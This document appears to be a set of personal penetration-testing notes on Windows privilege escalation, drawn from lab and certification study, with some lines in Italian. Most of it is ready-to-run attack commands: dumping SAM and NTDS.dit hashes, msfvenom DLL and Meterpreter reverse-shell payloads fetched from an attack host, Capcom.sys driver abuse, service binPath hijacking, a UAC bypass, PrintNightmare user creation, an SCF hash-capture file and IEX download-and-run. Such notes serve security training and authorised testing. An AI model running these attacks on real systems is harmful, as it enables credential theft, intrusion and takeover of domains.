```powershell
# per abilitare il privilegio
Import-Module .\Enable-Privilege.ps1
.\Enable-Privilege.ps1

# check
whoami /priv

# bisogna poi scegliere un file target e prenderne possesso
takeown /f 'C:\Path_To_File\file.txt'

# se non si ha il permesso di leggere il file, bisogna modificare l'ACL tramite icacls
icacls 'C:\Path_To_File\file.txt' /grant htb-student:F
```

# Others

## SAM, SYSTEM, Security Files

```bash
upload mimikatz64.exe

./mimikatz64.exe "lsadump::sam /system:C:\windows.old\windows\system32\SYSTEM /sam:C:\windows.old\windows\system32\SAM" exit 
```

```bash
whoami /all #BUILTIN\Administrators
```

If you are a local administrator, you can drill into the contents of the SAM database to find the administrator's (or other users') password.

```cmd-session
reg save HKLM\SYSTEM SAM
reg save HKLM\SECURITY SYSTEM
reg save HKLM\SAM SECURITY
```

Una volta ricavato viene portato sulla kali in qualche modo (ad esempio qui tramite evil-winrm):

```bash
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SECURITY
```

Once obtained it is brought to kali somehow (for example here via evil-winrm):

```bash
# alternativa 1
secretsdump.py -sam SAM -security SYSTEM -system SECURITY LOCAL

# alternativa 2
impacket-secretsdump -sam SAM -security SYSTEM -system SECURITY LOCAL

# alternativa 3
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

Output example:

```
samdump2 SYSTEM SAM                                                                                                                     
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```
creddump7                       
creddump7 - Python tool to extract credentials and secrets from Windows registry hives
/usr/share/creddump7
├── cachedump.py
├── framework
├── lsadump.py
├── pwdump.py
└── __pycache_

./pwdump.py /home/kali/Documents/OSCP/OSCPA/10.10.124.142/loot/SYSTEM /home/kali/Documents/OSCP/OSCPA/10.10.124.142/loot/SAM    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
```

## [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

When you are a local administrator on a host you can run this to hash other users' passwords:

```powershell-session
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y
```

## Windows Group Privileges
### Backup Operators Group

```
whoami /groups
```

Membership of this group grants its members the **SeBackup** and **SeRestore** privileges. The **SeBackupPrivilege** allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the **FILE_FLAG_BACKUP_SEMANTICS** flag.

We can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the **SeBackupPrivilege**.

First, let's import the libraries in a PowerShell session (CARICARE PRIMA I FILE SULLA MACCHINA).

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Check if **SeBackupPrivilege** is enabled.

```powershell
whoami /priv

# or

Get-SeBackupPrivilege
```

If the privilege is disabled, we can enable it.

```powershell
Set-SeBackupPrivilege
```

This privilege can now be leveraged to copy any protected file.

```powershell
Copy-FileSeBackupPrivilege 'C:\PATH_TO_FILE\FILE.txt' .\FILE.txt
```

#### Attacking a Domain Controller - Copying NTDS.dit

This group also permits logging in locally to a domain controller. The active directory database **NTDS.dit** is a very attractive target, as it contains the **NTLM hashes** for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users.

As the **NTDS.dit** file is locked by default, we can use the Windows **diskshadow** utility to create a **shadow copy** of the C drive and expose it as E drive. The **NTDS.dit** in this **shadow copy** won't be in use by the system.

```powershell
diskshadow.exe
```

```powershell
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Next, we can use the **Copy-FileSeBackupPrivilege** cmdlet to bypass the ACL and copy the **NTDS.dit** locally.

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

With the **NTDS.dit** extracted, we can use a tool such as **secretsdump.py** or the PowerShell **DSInternals** module to extract all Active Directory account credentials. Let's obtain the NTLM **hash** for just the administrator account for the domain using DSInternals.

```shell
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

#### Backing up SAM and SYSTEM Registry Hives

The privilege also lets us back up the **SAM** and **SYSTEM** registry hives, which we can extract local account credentials offline using a tool such as Impacket's **secretsdump.py**.

```shell
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

It's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the **FILE_FLAG_BACKUP_SEMANTICS** flag is specified.

### Event Log Readers Group

```powershell
whoami /groups
```

Administrators or members of the [Event Log Readers](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers) group have permission to access log files.

We can query Windows events from the command line using the **wevtutil** utility and the **Get-WinEvent** PowerShell cmdlet.

```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

We can also specify alternate credentials for **wevtutil** using the parameters `/u` and `/p`.

```powershell
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

For **Get-WinEvent**, the syntax is as follows. In this example, we filter for process creation events (4688), which contain `/user` in the process command line.

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```


### DnsAdmins Group

```powershell
whoami /groups
```

Members of the **DnsAdmins** group have access to DNS information on the network. The DNS service runs as **NT AUTHORITY\SYSTEM**, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. 

It is possible to use the built-in **dnscmd** utility to specify the path of the plugin DLL. As detailed in this [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller:
- DNS management is performed over RPC
- **ServerLevelPluginDll** allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the dnscmd tool from the command line
- When a member of the **DnsAdmins** group runs the **dnscmd** command below, the **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll** registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

We can generate a malicious DLL to add a user to the domain admins group using **msfvenom**.

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Next, start a Python HTTP server.

```bash
python3 -m http.server 7777
```

Download the file to the target.

```powershell
# POWERSHELL
wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

Loading DLL as Member of **DnsAdmins**.

```powershell
# CMD
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Only the **dnscmd** utility can be used by members of the **DnsAdmins** group, as they do not directly have permission on the registry key.

With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.

After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.

Once we have the user's SID, we can use the **sc** command to check permissions on the service.

```powershell
# CMD
wmic useraccount where "name=netadm" get sid
```

```powershell
# CMD
sc.exe sdshow DNS
```

We can issue the following commands to stop and start the service.

```powershell
# CMD
sc stop dns
sc start dns
```

If all goes to plan, our account will be added to the **Domain Admins** group or receive a **reverse shell** if our custom DLL was made to give us a connection back.


```powershell
# CMD
net group "Domain Admins" /dom
```

**IMPORTANTE**: Alcune volte occorre effettuare il log out e il login per abilitare effettivamente i privilegi!

### # Hyper-V Administrators Group

```powershell
whoami /groups
```

The **Hyper-V Administrators** group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the **NTDS.dit** file and extract NTLM password hashes for all users in the domain.

It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, **vmms.exe** attempts to restore the original file permissions on the corresponding **.vhdx** file and does so as **NT AUTHORITY\SYSTEM**, without impersonating the user. We can delete the **.vhdx** file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

### Print Operators Group

```powershell
powershell -ep bypass
whoami /groups
```

**Print Operators** is another highly privileged group, which grants its members the **SeLoadDriverPrivilege**, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.

**IMPORTANTE**: potrebbe essere necessario aprire una shell con privilegi da amministarore.

It's well known that the driver **Capcom.sys** contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.

Download it locally and edit it, pasting over the includes below.

```bash
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**.


```bash
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to **C:\temp**. Issue the commands below to add a reference to this driver under our **HKEY_CURRENT_USER** tree.

```bash
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the **Capcom.sys** driver is not loaded.

```powershell
# POWERSHELL
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

Run the **EnableSeLoadDriverPrivilege.exe** binary.

```bash
EnableSeLoadDriverPrivilege.exe
```

Next, verify that the Capcom driver is now listed.

```powershell
# POWERSHELL
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

```powershell
# POWERSHELL
.\ExploitCapcom.exe
```

#### Automating the Steps 

We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing **NTLoadDriver** to load the driver. To do this, we would run the following:

```bash
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

We would then run **ExploitCapcom.exe** to pop a SYSTEM shell or run our custom binary.

### Server Operators Group

```powershell
whoami /groups
```

The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful **SeBackupPrivilege** and **SeRestorePrivilege** privileges and the ability to control local services.

Let's examine the **AppReadiness** service. We can confirm that this service starts as SYSTEM using the **sc.exe** utility.

```bash
sc qc AppReadiness
```

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. **PsService** works much like the **sc** utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

```bash
c:\Tools\PsService.exe security AppReadiness
```

In this way we can can confirm that the Server Operators group has **SERVICE_ALL_ACCESS** access right, which gives us full control over this service.

Let's change the binary path to execute a command which adds our current user to the default local administrators group.

```bash
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

Starting the service fails, which is expected.

```bash
sc start AppReadiness
```

If we check the membership of the administrators group, we see that the command was executed successfully.

```bash
net localgroup Administrators
```

**IMPORTANTE**: Alcune volte occorre effettuare il log out e il login per abilitare effettivamente i privilegi!

From here, we have full control over the Domain Controller and could retrieve all credentials from the **NTDS database** and access other systems, and perform post-exploitation tasks.

```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

Retrieving NTLM Password Hashes from the Domain Controller.

```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

## Change User Password

```powershell
net user $USERNAME $PASSWORD
```

## Enable RDP User

```powershell
NET LOCALGROUP "Remote Desktop Users" $USERNAME /ADD
```

```bash
netexec smb $IP -u USERNAME -p PASSWORD -M rdp -o ACTION=enable
```

- https://github.com/crazywifi/Enable-RDP-One-Liner-CMD

## Bypassing User Account Control (UAC)

Even though the newly established user `backdoor` is a member of  **Administrators** group, accessing the **C:\users\Administrator** directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorized changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

```powershell
powershell -ep bypass
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

## PowerShell Credentials

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

Take, for example, the following script **Connect-VC.ps1**, which a sysadmin has created to connect to a vCenter server easily.

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

## Interacting with Users

### Monitoring for Process Command Lines

When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```shell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

We can host the script on our attack machine and execute it on the target host as follows.

```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

### Malicious SCF File

Create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.

```shell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.

```bash
sudo responder -I tun0
```

## Notable Vulnerabilities

### Enumerating Missing Patches

The first step is looking at installed updates and attempting to find updates that may have been missed, thus, opening up an attack path for us.

**Examining Installed Updates**

We can examine the installed updates in several ways. Below are three separate commands we can use.

```powershell
systeminfo
wmic qfe list brief
Get-Hotfix
```

We can search for each KB (Microsoft Knowledge Base ID number) in the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) to get a better idea of what fixes have been installed and how far behind the system may be on security updates.

### Eternal Blue (MS17-010)

[EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. As with MS08-067, this vulnerability can also be leveraged as a local privilege escalation vector if we land on a host where port 445 is firewalled off. There are various versions of this exploit for the Metasploit Framework as well as standalone exploit scripts.

**ALPC Task Scheduler 0-Day**

The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to **.job** files located in the **C:\Windows\tasks** directory. An attacker could leverage this to create a hard link to a file that the attacker controls. The exploit for this flaw used the [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service. An in-depth writeup is available [here](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html).

### HiveNightmare (SeriousSam) (CVE-2021-36934)

This is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as **SecretsDump.py**. More information about this flaw can be found [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) and [this](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe) exploit binary can be used to create copies of the three files to our working directory. This [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) can be used to detect the flaw and also fix the ACL issue.

**Checking Permissions on the SAM File**

```powershell
icacls c:\Windows\System32\config\SAM
```

Successful exploitation also requires the presence of one or more **shadow copies**. Most Windows 10 systems will have **System Protection** enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.

**Performing Attack and Parsing Password Hashes**

This [PoC](https://github.com/GossiTheDog/HiveNightmare) can be used to perform the attack, creating copies of the aforementioned registry hives.

```powershell
C:\Users\htb-student\Desktop> .\HiveNightmare.exe
```

These copies can then be transferred back to the attack host, where **impacket-secretsdump** is used to extract the hashes.

```bash
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

### PrintNightmare (CVE-2021-1675) (CVE-2021-34527)

This is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege **SeLoadDriverPrivilege** the ability to add drivers to a remote **Print Spooler**. This right is typically reserved for users in the built-in Administrators group and **Print Operators** who may have a legitimate need to install a printer driver on an end user's machine remotely. The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system. The flaw affects every supported version of Windows, and being that the Print Spooler runs by default on Domain Controllers, Windows 7 and 10, and is often enabled on Windows servers, this presents a massive attack surface, hence "nightmare."

Microsoft initially released a patch that did not fix the issue (and early guidance was to disable the Spooler service, which is not practical for many organizations) but released a second [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) in July of 2021 along with guidance to check that specific registry settings are either set to **0** or not defined. Once this vulnerability was made public, PoC exploits were released rather quickly. [This](https://github.com/cube0x0/CVE-2021-1675) version by [@cube0x0](https://twitter.com/cube0x0) can be used to execute a malicious DLL remotely or locally using a modified version of Impacket. The repo also contains a C# implementation. This [PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.

**Checking for Spooler Service**

```powershell
# POWERSHELL
ls \\localhost\pipe\spoolss
```

If it is not running, we will receive a "path does not exist" error.

**Adding Local Admin with PrintNightmare PowerShell PoC**

First start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host.

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

Now we can import the PowerShell script and use it to add a new local admin user.

```powershell
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

**Confirming New Admin User**

```powershell
net user hacker
```

### Kernel Elevation of Privilege Vulnerability (CVE-2020-0668)

The [Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/) consist in exploing an arbitrary file move vulnerability leveraging the Windows Service Tracing. Service Tracing allows users to troubleshoot issues with running services and modules by generating debug information. Its parameters are configurable using the Windows registry. Setting a custom MaxFileSize value that is smaller than the size of the file prompts the file to be renamed with a **.OLD** extension when the service is triggered. This move operation is performed by **NT AUTHORITY\SYSTEM**, and can be abused to move a file of our choosing with the help of mount points and symbolic links.

**Checking Current User Privileges**

```shell
whoami /priv
```

![[Esempio_CVE-2020-0668_1.png]]

**After Building Solution**

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

```shell
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.

- **C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe**

**Checking Permissions on Binary**

```powershell
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**icacls** confirms that we only have read and execute permissions on this binary based on the line **BUILTIN\Users:(I)(RX)** in the command output.

![[Esempio_CVE-2020-0668_2.png]]

**Generating Malicious Binary**

Let's generate a malicious **maintenanceservice.exe** binary that can be used to obtain a Meterpreter reverse shell connection from our target.

```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

**Download the Malicious Binary**

We can download it to the target using cURL after starting a Python HTTP server on our attack host.

For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.

We need to do this because running the exploit corrupts the malicious version of **maintenanceservice.exe** that is moved to (our copy in **c:\Users\htb-student\Desktop** that we are targeting) **c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe** which we will need to account for later. If we attempt to utilize the copied version, we will receive a **system error 216** because the .exe file is no longer a valid binary.

```shell-session
python3 -m http.server 8080

wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

**Running the Exploit**

```shell
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                    
```

**Checking Permissions of New File**

The exploit runs and executing **icacls** again shows the following entry for our user: **INLPE-WS02\htb-student:(F)**. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.

**Replacing File with Malicious Binary**

We can overwrite the **maintenanceservice.exe** binary in **c:\Program Files (x86)\Mozilla Maintenance Service** with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to **C:\Users\htb-student\Desktop**, **maintenanceservice.exe** and **maintenanceservice2.exe**. Let's move the good copy that was not corrupted by the exploit **maintenanceservice2.exe** to the Program Files directory, making sure to rename the file properly and remove the **2** or the service won't start. The **copy** command will only work from a cmd.exe window, not a PowerShell console.

```shell
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**Metasploit Resource Script**

```shell
sudo msfconsole -r handler.rc

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

**Starting the Service**

```shell
net start MozillaMaintenance
```